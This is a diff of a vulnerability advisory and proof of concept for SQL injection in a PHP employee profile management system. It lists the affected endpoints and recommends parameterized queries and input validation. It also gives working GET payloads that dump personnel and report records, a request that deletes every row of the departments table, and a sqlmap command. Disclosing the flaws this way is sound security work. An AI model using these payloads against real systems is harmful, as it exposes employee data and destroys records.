@@ -5,119 +5,123 @@ Proof-of-Concept and Advisory for Employee Profile Management System SQLi
 
 ## Affected Version
 
-**Employee Profile Management System in PHP**
+ Employee Profile Management System 
 
 ---
 
 ## Vulnerability Type
 
-**SQL Injection** in multiple endpoints:
+SQL Injection — Multiple Endpoints (per_id, dept_id, term, etc.)
 
-edit_personnel.php (parameter per_id)
+   edit_personnel.php (parameter per_id)
 
-view_personnel.php (parameter per_id)
+   view_personnel.php (parameter per_id)
 
-print_personnel_report.php (parameter term)
+   print_personnel_report.php (parameter term)
 
-file_table.php (parameter term)
+   file_table.php (parameter term)
 
-delete_department.php (parameter dept_id)
+   delete_department.php (parameter dept_id)
 
-delete_personnel.php (parameter per_id)
+   delete_personnel.php (parameter per_id)
 
-delete_position.php (likely position ID parameter)
+   delete_position.php (likely position ID parameter)
 
-delete_rank.php (likely rank ID parameter)
-
-These scripts build SQL strings by concatenating user-controlled parameters (per_id, dept_id, term, etc.) into the query and then calling PDO::prepare() without using ? placeholders and bound parameters. As a result, the “prepared” statement is still fully injectable.
+   delete_rank.php (likely rank ID parameter)
 
 ---
 
 ## Advisory (Recommendations)
 
-### Use proper parameterized queries
+### Use Parameterized Queries Properly
 
-Replace string concatenation like:
-
-      $sql = "SELECT * FROM personnel WHERE per_id = " . $_GET['per_id'];
+The application uses **PDO::prepare()** but still concatenates user-controlled parameters into SQL strings. Replace all patterns like:
+      
+      $sql = "SELECT * FROM personnel WHERE per_id = ".$_GET['per_id'];
       $stmt = $pdo->prepare($sql);
-      $stmt->execute();
 
 
-with:
+with safe parameter binding:
 
-      $stmt = $pdo->prepare("SELECT * FROM personnel WHERE per_id = :per_id");
-      $stmt->execute([':per_id' => $_GET['per_id']]);
+      $stmt = $pdo->prepare("SELECT * FROM personnel WHERE per_id = :id");
+      $stmt->execute([':id' => $_GET['per_id']]);
 
+### Validate All External Input
 
-Apply this to all affected files (edit_personnel.php, view_personnel.php, print_personnel_report.php, file_table.php, delete_*.php).
+   Enforce integer-only checks for per_id, dept_id, position_id, rank_id.
 
-### Enforce strict input validation & type checking
+   Whitelist allowed term formats (e.g., YYYY-S).
 
-  per_id, dept_id, and similar IDs should be integers only (e.g. ctype_digit() / casts plus rejection on failure).
-
-  term should be validated against a whitelist (e.g. allowed year, semester, or term codes).
-
-### Limit database privileges
-
-  Use a dedicated DB user with only the minimal privileges required.
-
-  Separate accounts for read-only operations (view/report) and write/delete operations.
-
-### Add centralized query helper layer
-
-  Wrap all DB access through a small helper function enforcing parameterized queries and validation.
-
-  Avoid inline SQL wherever possible.
-
----  
+---
 
 ## Proof-of-Concept (Exploit)
 
-The following PoCs assume the application is running locally at:
-http://localhost/employee_profile/
-Adjust the base path to match your deployment.
+**Exploit Steps**
 
-### 1. Data Extraction via per_id in view_personnel.php
+### Intercept Request
+Use Burp Suite, Fiddler, or browser dev tools to capture requests sent to vulnerable scripts:
 
-**Vulnerable pattern (conceptual)**:
+   view_personnel.php
+   
+   edit_personnel.php
+   
+   file_table.php
+   
+   print_personnel_report.php
+   
+   delete_department.php, delete_personnel.php, delete_position.php, delete_rank.php
 
-      // view_personnel.php
-      $per_id = $_GET['per_id']; // no validation
-      $sql = "SELECT * FROM personnel WHERE per_id = " . $per_id;
-      $stmt = $pdo->prepare($sql);
-      $stmt->execute();
+### Modify Parameters
+Inject a SQL payload inside per_id, dept_id, or term.
+Example injection payload (simple boolean-based):
 
-
-**HTTP Request (GET)**
-
-This payload turns the WHERE clause into a tautology and can leak multiple personnel records:
-
-      GET /employee_profile/view_personnel.php?per_id=1%27%20OR%201=1--%20 HTTP/1.1
-      Host: localhost
-      User-Agent: Mozilla/5.0
-      Accept: */*
-      Connection: close
-      
-
-**Expected effect**:
-
-Instead of showing only the record for per_id = 1, the page will list all personnel records (or at least more than one), proving SQL injection via per_id.
-
-### 2. Data Extraction via per_id in edit_personnel.php
-
-If edit_personnel.php loads the existing record using per_id similarly, the same payload can be reused.
-
-**HTTP Request (GET)**
-
-    GET /employee_profile/edit_personnel.php?per_id=1%27%20OR%201=1--%20 HTTP/1.1
-    Host: localhost
-    User-Agent: Mozilla/5.0
-    Accept: */*
-    Connection: close
+         1' OR '1'='1--
 
 
-**Verification**:
+### Submit Modified Request
+   Forward the injected request to the server.
 
-If the edit form shows information for multiple users or crashes with a SQL error containing your injected fragment, the injection is confirmed.
+### Observe Behavior
 
+   Data pages (view/edit/report) will return all rows instead of one.
+   
+   Delete pages may delete entire tables if unprotected.
+   
+   SQL errors may reveal DB structure, confirming injection.
+
+## Example PoC Payloads 
+### 1. Data Extraction — **view_personnel.php**
+
+**Request**:
+
+      GET /employee_profile/view_personnel.php?per_id=1' OR '1'='1-- 
+
+
+**Effect**:
+Displays information for multiple personnel records.
+
+### 2. Data Extraction — print_personnel_report.php
+
+**Request**:
+
+      GET /employee_profile/print_personnel_report.php?term=2024-1' OR '1'='1-- 
+
+
+**Effect**:
+Returns reports for all terms instead of one.
+
+### 3. Destructive Injection — delete_department.php
+
+For testing on local instance only.
+
+**Request**:
+
+      GET /employee_profile/delete_department.php?dept_id=0 OR 1=1-- 
+
+
+**Effect**:
+Deletes all rows in the departments table.
+
+### 4. Using sqlmap (Optional Automated Exploit)
+      sqlmap -u "http://localhost/employee_profile/view_personnel.php?per_id=1" \
+        -p per_id --dbs
